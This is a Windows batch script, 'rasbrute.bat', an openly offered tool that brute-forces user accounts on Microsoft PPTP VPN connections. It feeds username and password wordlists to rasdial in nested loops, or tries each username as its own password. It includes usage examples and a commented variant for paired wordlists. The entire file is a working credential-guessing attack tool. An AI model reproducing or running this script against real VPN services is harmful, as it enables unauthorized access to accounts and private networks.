@echo off

rem $Id: rasbrute.bat,v 1.6 2012/07/13 09:11:10 raptor Exp $
rem
rem rasbrute.bat v0.4 - micro$oft pptp vpn batch bruteforce cracker
rem Copyright [c] 2006-2012 by Marco Ivaldi [raptor@0xdeadbeef.info]
rem
rem rasbrute.bat is a very basic and easily customizable dos bat
rem script [!] for remote account bruteforcing of micro$oft pptp
rem vpn connections [must specify a valid pptp connection label]
rem
rem usage example [single]: rasbrute.bat VPN1 user.txt
rem usage example [double]: rasbrute.bat VPN1 user.txt pass.txt
rem
rem rasdial syntax: rasdial conn [user [pass|*]] [/domain:name]

echo.
echo rasbrute.bat v0.3 - micro$oft pptp batch bruteforce cracker
echo Copyright [c] 2006 by Marco Ivaldi [raptor@0xdeadbeef.info]
echo.

if (%2) == () goto usage
if (%3) == () goto single

:double
echo ---breaking on %1 pptp begin at %date% %time% [double mode]---
@echo on
@for /f %%i in (%2) do @for /f %%j in (%3) do ping -n 1 microsoft.com | rasdial %1 %%i %%j
@echo off
echo ---breaking on %1 pptp ended at %date% %time% [double mode]--
goto end

:single
echo ---breaking on %1 pptp begin at %date% %time% [single mode]---
@echo on
@for /f %%i in (%2) do ping -n 1 microsoft.com | rasdial %1 %%i %%i
:: use the following instead for a wordlist in "username password" format
:: @for /f "tokens=1,2" %%a in (%2) do ping -n 1 microsoft.com | rasdial %1 %%a %%b
@echo off
echo ---breaking on %1 pptp ended at %date% %time% [single mode]---
goto end

:usage
echo usage  : rasbrute.bat [[connection] [userlist]] [passlist]
echo example: rasbrute.bat VPN1 user.txt
echo example: rasbrute.bat VPN1 user.txt pass.txt

:end
